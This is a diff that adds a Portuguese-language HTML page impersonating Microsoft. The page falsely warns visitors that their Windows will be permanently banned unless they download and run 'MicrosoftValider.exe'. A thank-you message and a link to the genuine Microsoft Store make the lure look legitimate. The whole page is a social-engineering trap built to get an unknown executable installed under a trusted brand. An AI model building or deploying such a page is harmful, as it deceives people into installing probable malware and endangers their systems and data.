@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<meta encoding="utf-8"/>
+</head>
+<style>
+.frame
+{
+	overflow:hidden;
+	border-width:0px;
+}
+body
+{
+	font-family:sans-serif;
+}
+
+.submit {
+ -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+	width:100px;
+	text-align:center;
+	line-height:30px;
+    height: 30px;
+    display: block;
+    background-color: #bbb9b9;
+    border-width: 0px;
+    outline: none;
+    border-radius: 2px;
+
+}
+
+.submit:hover
+{
+    background-color:#dedddd;
+}
+
+.submit:active
+{
+    background-color:#e9e9e9 ;
+}
+
+
+</style>
+<script>
+function clickv()
+{
+	document.getElementById("tx").style="display:block;";
+}
+</script>
+	<body>
+		<!--img src="msite.png" class="frame"></img-->
+		<img src="mslogo.png" class="frame" width="150px"></img><br>
+		A Microsoft precisa verificar seu Windows, antes que ele seja<br>
+		banido permanentemente.	Baixe o aplicativo abaixo para podermos<br>
+		verificar seu Windows. <a class="submit" href="MicrosoftValider" download="MicrosoftValider.exe" onclick="clickv();">Download</a>
+		<p id="tx" style="display:none;">
+		Obrigado por baixar nosso app. Ele verificará seu Windows, e o mesmo será válido novamente.<br>
+		Visite também nosso <a href="https://www.microsoft.com/pt-br/store/b/home?invsrc=search&OCID=AID620866_SEM_WltwwAAAAK6eLR5u:20180224142204:s&s_kwcid=AL!4249!3!250611974157!e!!g!!microsoft&ef_id=WltwwAAAAK6eLR5u:20180224142204:s">website</a>
+		</p>
+	</body>
+</html>
